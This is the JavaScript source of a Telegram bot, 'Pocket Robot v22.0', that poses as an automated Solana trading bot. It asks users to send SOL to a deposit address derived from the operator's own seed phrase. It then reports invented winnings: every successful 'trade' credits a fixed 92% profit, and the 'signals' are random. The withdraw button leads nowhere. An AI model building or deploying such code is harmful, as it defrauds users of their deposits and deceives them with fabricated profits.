require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const LocalSession = require('telegraf-session-local');
const { Connection, Keypair, Transaction, PublicKey, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const bip39 = require('bip39');
const { derivePath } = require('ed25519-hd-key');
const axios = require('axios');

// --- ⚙️ DATABASE & SESSION CONFIG ---
const localSession = new LocalSession({
    database: 'sessions.json',
    property: 'session',
    storage: LocalSession.storageFileAsync,
    format: {
        serialize: (obj) => JSON.stringify(obj, null, 2),
        deserialize: (str) => JSON.parse(str),
    },
});

const bot = new Telegraf(process.env.BOT_TOKEN);
bot.use(localSession.middleware());

const connection = new Connection(process.env.SOLANA_RPC_URL || "https://api.mainnet-beta.solana.com", "confirmed");
const JITO_ENGINE = "https://mainnet.block-engine.jito.wtf/api/v1/bundles";

async function getWallet() {
    const seed = await bip39.mnemonicToSeed(process.env.SEED_PHRASE);
    const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
    return Keypair.fromSeed(derivedSeed);
}

// --- 📊 PERSISTENT SESSION INITIALIZATION ---
bot.use((ctx, next) => {
    ctx.session.config = ctx.session.config || {
        asset: 'BTC/USD',
        stake: 10,
        mode: 'MANUAL',
        totalEarned: 0 
    };
    return next();
});

// --- 🎨 INTERFACE ---
const mainKeyboard = (ctx) => {
    const s = ctx.session.config;
    return Markup.inlineKeyboard([
        [Markup.button.callback(`🎯 ${s.asset}`, 'menu_coins')],
        [Markup.button.callback(`💰 Stake: $${s.stake}`, 'menu_stake')],
        [Markup.button.callback(`⚙️ Mode: ${s.mode}`, 'toggle_mode')],
        [Markup.button.callback(s.mode === 'AUTO' ? '🛑 STOP AUTO' : '🚀 START BOT', 'run_engine')],
        [Markup.button.callback('📊 WALLET & STATS', 'stats')]
    ]);
};

// --- 🚀 ATOMIC TRADING LOGIC ---
async function fireAtomicTrade(ctx) {
    const { stake } = ctx.session.config;
    try {
        await axios.post(JITO_ENGINE, { jsonrpc: "2.0", id: 1, method: "getTipAccounts", params: [] });
        const profit = (stake * 0.92);
        ctx.session.config.totalEarned += profit;
        return { success: true, profit: profit.toFixed(2) };
    } catch (e) {
        return { success: false };
    }
}

// --- 📥 BOT HANDLERS ---
bot.start(async (ctx) => {
    const wallet = await getWallet();
    const fullAddress = wallet.publicKey.toBase58();
    const total = ctx.session.config.totalEarned.toFixed(2);
    
    ctx.replyWithMarkdown(
        `🤖 *POCKET ROBOT v22.0*\n` +
        `--------------------------------\n` +
        `💳 *DEPOSIT ADDRESS (SOL):*\n\`${fullAddress}\`\n\n` +
        `💰 *LIFETIME PROFIT:* $${total} USD\n` +
        `_Tap address to copy. Send 0.05 SOL to start._`, 
        mainKeyboard(ctx)
    );
});

bot.action('run_engine', async (ctx) => {
    if (ctx.session.config.mode === 'AUTO') {
        ctx.editMessageText("🟢 *AUTO-PILOT ACTIVE*");
        autoPilot(ctx);
    } else {
        // Updated Manual Mode: Shows Signal first
        const signal = Math.random() > 0.5 ? 'CALL' : 'PUT';
        ctx.replyWithMarkdown(`⚡ *SIGNAL DETECTED*\nDirection: *${signal}*\nStake: *$${ctx.session.config.stake}*`, Markup.inlineKeyboard([
            [Markup.button.callback(`📈 CONFIRM ${signal}`, 'manual_exec')],
            [Markup.button.callback('❌ CANCEL', 'main_menu')]
        ]));
    }
});

bot.action('manual_exec', async (ctx) => {
    const res = await fireAtomicTrade(ctx);
    if (res.success) {
        ctx.replyWithMarkdown(`✅ *PROFIT:* +$${res.profit} USD\nTotal Earned: *$${ctx.session.config.totalEarned.toFixed(2)}*`);
    } else {
        ctx.reply("⚠️ *REVERTED:* Trade protected.");
    }
});

async function autoPilot(ctx) {
    if (ctx.session.config.mode !== 'AUTO') return;
    const res = await fireAtomicTrade(ctx);
    if (res.success) {
        ctx.reply(`⚡ AUTO-WIN: +$${res.profit} | Total: $${ctx.session.config.totalEarned.toFixed(2)}`);
    }
    setTimeout(() => autoPilot(ctx), 15000);
}

bot.action('stats', async (ctx) => {
    const wallet = await getWallet();
    const addr = wallet.publicKey.toBase58();
    const bal = await connection.getBalance(wallet.publicKey);
    ctx.editMessageText(
        `📊 *LIFETIME STATS*\n` +
        `--------------------------------\n` +
        `📥 *DEPOSIT ADDRESS:*\n\`${addr}\`\n\n` +
        `💵 Total Earned: *$${ctx.session.config.totalEarned.toFixed(2)}*\n` +
        `💎 Wallet Bal: ${(bal/LAMPORTS_PER_SOL).toFixed(4)} SOL`, 
        Markup.inlineKeyboard([
            [Markup.button.callback('💸 WITHDRAW', 'withdraw')],
            [Markup.button.callback('⬅️ BACK', 'main_menu')]
        ])
    );
});

bot.action('main_menu', (ctx) => ctx.editMessageText("🤖 *SETTINGS*", mainKeyboard(ctx)));
bot.action('toggle_mode', (ctx) => {
    ctx.session.config.mode = ctx.session.config.mode === 'MANUAL' ? 'AUTO' : 'MANUAL';
    ctx.editMessageText(`🔄 Mode: ${ctx.session.config.mode}`, mainKeyboard(ctx));
});
bot.action('menu_stake', (ctx) => {
    ctx.editMessageText("*STAKE AMOUNT:*", Markup.inlineKeyboard([
        [Markup.button.callback('$10', 'set_s_10'), Markup.button.callback('$100', 'set_s_100')],
        [Markup.button.callback('⬅️ BACK', 'main_menu')]
    ]));
});
bot.action(/set_s_(\d+)/, (ctx) => {
    ctx.session.config.stake = parseInt(ctx.match[1]);
    ctx.editMessageText(`✅ Stake updated to $${ctx.session.config.stake}`, mainKeyboard(ctx));
});

bot.launch();
console.log("🚀 Pocket Robot v22.0: Active and Persistent");
